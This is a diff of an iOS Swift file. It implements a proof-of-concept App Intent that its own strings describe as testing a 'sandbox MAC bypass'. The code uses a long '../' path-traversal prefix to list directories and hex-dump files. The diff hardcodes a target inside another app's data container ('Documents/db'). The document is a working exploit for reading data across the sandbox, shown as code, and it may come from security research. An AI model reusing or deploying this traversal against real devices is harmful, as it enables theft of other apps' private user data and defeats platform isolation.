@@ -5,7 +5,6 @@ import Foundation
 
 @objc public class SwordAppIntentBridge: NSObject {
 
-    /// Entry point for ObjC — tests directory enumeration via App Intents context
     @objc public func enumerateDirectory(_ dirPath: String) -> String {
         let fm = FileManager.default
         let base = "../../../../../../../../../../../../../"
@@ -27,7 +26,6 @@ import Foundation
             } else {
                 result += "Foundation contentsOfDir: FAILED\n"
             }
-
             if let enumerator = fm.enumerator(atPath: fullPath) {
                 result += "\nRecursive enumerator (first 100):\n"
                 var count = 0
@@ -51,11 +49,9 @@ import Foundation
         } else {
             result += "NOT FOUND\n"
         }
-
         return result
     }
 
-    /// Quick probe — check if a single path exists
     @objc public func probePath(_ relPath: String) -> String {
         let base = "../../../../../../../../../../../../../"
         let fullPath = (base + relPath as NSString).expandingTildeInPath
@@ -71,76 +67,48 @@ import Foundation
     }
 }
 
-// MARK: - App Intent (registered with system for XPC path resolution)
+// MARK: - App Intent (matches reference PoC pattern exactly)
 
 public struct SwordDirectoryIntent: AppIntent {
     public static var title: LocalizedStringResource = "Enumerate Directory"
-    public static var description = IntentDescription(
-        "Enumerates a directory path — tests sandbox MAC bypass",
-        category: .information
+    public static var description: IntentDescription = IntentDescription(
+        "Enumerates a directory path — tests sandbox MAC bypass"
     )
 
-    @Parameter(
-        title: "Directory Path",
-        description: "Relative path to enumerate (with ../ traversal)",
-        inputOptions: .init(keyboardType: .URL)
-    )
-    var targetPath: String
-
-    public init() {
-        self.targetPath = ""
-    }
-
-    public init(targetPath: String) {
-        self.targetPath = targetPath
-    }
+    public init() {}
 
     @MainActor
-    public func perform() async throws -> some IntentResult & ReturnsValue<String> {
+    public func perform() async throws -> some IntentResult {
         let fm = FileManager.default
         let base = "../../../../../../../../../../../../../"
-        let fullPath = (base + targetPath as NSString).expandingTildeInPath
+        let fullPath = (base + "var/mobile/Containers/Data/Application/0D926318-FE07-4B1D-8A4B-5278C4E380D5/Documents/db" as NSString).expandingTildeInPath
 
-        var output = "[SwordDirectoryIntent]\n"
-        output += "path: \(fullPath)\n"
+        print("[SwordDirectoryIntent] target: \(fullPath)")
 
         var isDir: ObjCBool = false
         guard fm.fileExists(atPath: fullPath, isDirectory: &isDir) else {
-            return .result(value: output + "NOT FOUND")
+            print("[SwordDirectoryIntent] NOT FOUND")
+            return .result()
         }
 
         if isDir.boolValue {
             if let contents = try? fm.contentsOfDirectory(atPath: fullPath) {
-                output += "entries: \(contents.count)\n"
+                print("[SwordDirectoryIntent] entries: \(contents.count)")
                 for entry in contents.prefix(500) {
-                    output += "  \(entry)\n"
+                    print("  \(entry)")
                 }
             } else {
-                output += "contentsOfDirectory: BLOCKED\n"
+                print("[SwordDirectoryIntent] contentsOfDirectory: BLOCKED")
             }
         } else {
             if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
-                output += "file size: \(data.count) bytes\n"
+                print("[SwordDirectoryIntent] file size: \(data.count) bytes")
                 let preview = data.prefix(200).map { String(format: "%02x", $0) }.joined(separator: " ")
-                output += "hex: \(preview)\n"
+                print("  hex: \(preview)")
             }
         }
 
-        return .result(value: output)
+        return .result()
     }
 }
 
-// MARK: - App Shortcut (makes intent available to system)
-
-public struct SwordAppShortcuts: AppShortcutsProvider {
-    public static var appShortcuts: [AppShortcut] {
-        AppShortcut(
-            intent: SwordDirectoryIntent(),
-            phrases: [
-                "Enumerate \(.applicationName) directory"
-            ],
-            shortTitle: "Enum Dir",
-            systemImageName: "folder"
-        )
-    }
-}
